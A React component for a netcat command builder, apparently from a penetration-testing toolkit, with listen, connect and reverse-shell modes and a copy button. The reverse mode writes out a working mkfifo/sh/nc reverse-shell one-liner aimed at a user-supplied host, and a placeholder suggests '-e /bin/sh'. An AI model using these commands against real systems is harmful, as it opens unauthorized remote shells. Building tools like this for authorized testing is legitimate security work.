import { useState } from 'react';
import { FaNetworkWired, FaCopy, FaInfoCircle } from 'react-icons/fa';
import { toast } from 'react-toastify';
import { copyToClipboard } from '../../utils/copyToClipboard';

const NetcatBuilder = () => {
  const [mode, setMode] = useState('listen');
  const [host, setHost] = useState('');
  const [port, setPort] = useState('');
  const [extra, setExtra] = useState('');

  const buildCommand = () => {
    if (mode === 'listen') return `nc -lvnp ${port} ${extra}`.trim();
    if (mode === 'connect') return `nc ${host} ${port} ${extra}`.trim();
    if (mode === 'reverse') return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`;
    return '';
  };

  const handleCopy = async () => {
    try {
      await copyToClipboard(buildCommand());
      toast.success('Command copied!', { position: 'bottom-right', autoClose: 2000, hideProgressBar: true });
    } catch {
      toast.error('Failed to copy', { position: 'bottom-right', autoClose: 2000, hideProgressBar: true });
    }
  };

  return (
    <div className="command-builder">
      <div className="builder-header">
        <FaNetworkWired className="icon" />
        <h2>Netcat Command Builder</h2>
        <p>Network utility for reading/writing data</p>
      </div>
      <div className="form-group">
        <label>Mode <FaInfoCircle title="Choose what you want Netcat to do" /></label>
        <select className="select-input" value={mode} onChange={e => setMode(e.target.value)}>
          <option value="listen">Listener (bind shell)</option>
          <option value="connect">Connect (client)</option>
          <option value="reverse">Reverse Shell (Linux)</option>
        </select>
      </div>
      {mode !== 'listen' && (
        <div className="form-group">
          <label>Host</label>
          <input className="text-input" value={host} onChange={e => setHost(e.target.value)} placeholder="Target IP or Host" />
        </div>
      )}
      <div className="form-group">
        <label>Port</label>
        <input className="text-input" value={port} onChange={e => setPort(e.target.value)} placeholder="Port number" />
      </div>
      {mode !== 'reverse' && (
        <div className="form-group">
          <label>Extra Options</label>
          <input className="text-input" value={extra} onChange={e => setExtra(e.target.value)} placeholder="-u (UDP), -e /bin/sh, etc." />
        </div>
      )}
      <div className="command-preview">
        <div className="preview-header">
          <span>Preview</span>
          <button className="copy-button" onClick={handleCopy}><FaCopy /> Copy</button>
        </div>
        <code>{buildCommand()}</code>
      </div>
      <div className="info-tip">
        <FaInfoCircle className="icon" />
        <p>Netcat is a powerful tool for networking, file transfer, and shells. Use responsibly!</p>
      </div>
    </div>
  );
};

export default NetcatBuilder;
